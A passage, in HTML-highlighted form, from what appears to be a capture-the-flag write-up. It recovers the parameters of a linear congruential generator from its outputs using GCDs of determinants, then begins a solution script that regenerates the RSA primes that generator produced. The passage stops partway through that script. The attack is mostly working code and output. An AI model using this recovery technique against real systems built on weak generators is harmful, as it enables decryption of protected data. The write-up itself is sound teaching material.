&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;6729272950467625456298454678219613090467254824679318993052294587570153424935267364971827277137521929202783621553421958533761123653824135472378133765236115&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2230396903302352921484704122705539403201050490164649102182798059926343096511158288867301614648471516723052092761312105117735046752506523136197227936190287&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4578847787736143756850823407168519112175260092601476810539830792656568747136604250146858111418705054138266193348169239751046779010474924367072989895377792&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;7578332979479086546637469036948482551151240099803812235949997147892871097982293017256475189504447955147399405791875395450814297264039908361472603256921612&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2550420443270381003007873520763042837493244197616666667768397146110589301602119884836605418664463550865399026934848289084292975494312467018767881691302197&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;            ]
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            Det_X &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[]
&lt;&#x2F;span&gt;&lt;span&gt;            Det_X&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;calc_det&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;X))
&lt;&#x2F;span&gt;&lt;span&gt;            Det_X&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;calc_det&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;X))
&lt;&#x2F;span&gt;&lt;span&gt;            Det_X&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;calc_det&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;X))
&lt;&#x2F;span&gt;&lt;span&gt;            Det_X&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;calc_det&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;X))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            found_p &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;math&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gcd&lt;&#x2F;span&gt;&lt;span&gt;(math&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gcd&lt;&#x2F;span&gt;&lt;span&gt;(Det_X[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;Det_X[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;])&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;math&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gcd&lt;&#x2F;span&gt;&lt;span&gt;(Det_X[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;Det_X[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;]))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# To find &amp;#39;a&amp;#39; and &amp;#39;c&amp;#39; we need to solve the 
&lt;&#x2F;span&gt;&lt;span&gt;            mod_inv_a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;modInverse&lt;&#x2F;span&gt;&lt;span&gt;((X[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;X[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;])&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;found_p) 
&lt;&#x2F;span&gt;&lt;span&gt;            found_a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;((X[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;X[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;]) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;mod_inv_a) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span&gt;found_p
&lt;&#x2F;span&gt;&lt;span&gt;            
&lt;&#x2F;span&gt;&lt;span&gt;            found_c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(X[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;found_a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;X[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;]) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span&gt;found_p
&lt;&#x2F;span&gt;&lt;span&gt;           
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;n = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;m = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;c = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span&gt;(found_p&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;found_a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;found_c))
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;break
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;except &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;TypeError&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;pass
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;__main__&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#Output
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# n = 8311271273016946265169120092240227882013893131681882078655426814178920681968884651437107918874328518499850252591810409558783335118823692585959490215446923
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# m = 99470802153294399618017402366955844921383026244330401927153381788409087864090915476376417542092444282980114205684938728578475547514901286372129860608477
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# c = 3910539794193409979886870049869456815685040868312878537393070815966881265118275755165613835833103526090552456472867019296386475520134783987251699999776365
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;With these values as input we can find the modulus used in the encryption, &lt;code&gt;n&lt;&#x2F;code&gt;, &lt;code&gt;phi&lt;&#x2F;code&gt; and followed by &lt;code&gt;d&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Or we can just import the &lt;code&gt;public.pem&lt;&#x2F;code&gt; to find &lt;code&gt;e,n&lt;&#x2F;code&gt; used in the encryption.&lt;&#x2F;p&gt;
&lt;p&gt;Here is the final solution script to get the flag.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;Crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;PublicKey &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;RSA
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;Crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;Util&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;bytes_to_long&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;isPrime&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;long_to_bytes
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;LCG&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    lcg_m &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;99470802153294399618017402366955844921383026244330401927153381788409087864090915476376417542092444282980114205684938728578475547514901286372129860608477
&lt;&#x2F;span&gt;&lt;span&gt;    lcg_c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3910539794193409979886870049869456815685040868312878537393070815966881265118275755165613835833103526090552456472867019296386475520134783987251699999776365
&lt;&#x2F;span&gt;&lt;span&gt;    lcg_n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8311271273016946265169120092240227882013893131681882078655426814178920681968884651437107918874328518499850252591810409558783335118823692585959490215446923
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;lcg_s&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;state &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;lcg_s
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;next&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;state &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;state &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;lcg_m &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;lcg_c) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;lcg_n
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;state
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;__main__&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    it &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8
&lt;&#x2F;span&gt;&lt;span&gt;    bits &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;512
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Find prime value of specified bits a specified amount of times
&lt;&#x2F;span&gt;&lt;span&gt;    seed &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;211286818345627549183608678726370412218029639873054513839005340650674982169404937862395980568550063504804783328450267566224937880641772833325018028629959635
&lt;&#x2F;span&gt;&lt;span&gt;    lcg &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;LCG&lt;&#x2F;span&gt;&lt;span&gt;(seed)
&lt;&#x2F;span&gt;&lt;span&gt;    primes_arr &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[]
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;    dump &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;True
&lt;&#x2F;span&gt;&lt;span&gt;    items &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    primes_n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(it):
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                prime_candidate &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;lcg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;next&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;not &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;isPrime&lt;&#x2F;span&gt;&lt;span&gt;(prime_candidate):
&lt;&#x2F;span&gt;&lt;span&gt;                    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;continue
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span&gt;prime_candidate&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bit_length&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;bits:
&lt;&#x2F;span&gt;&lt;span&gt;                    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;continue
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                    primes_n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*= &lt;&#x2F;span&gt;&lt;span&gt;prime_candidate
&lt;&#x2F;span&gt;&lt;span&gt;                    primes_arr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(prime_candidate)
&lt;&#x2F;span&gt;&lt;span&gt;                    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;break
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Check bit length
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;primes_n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bit_length&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4096&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;bit length&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;primes_n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bit_length&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;            primes_arr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;clear&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;            primes_n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;continue
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;break
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Create public key &amp;#39;n&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;    n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
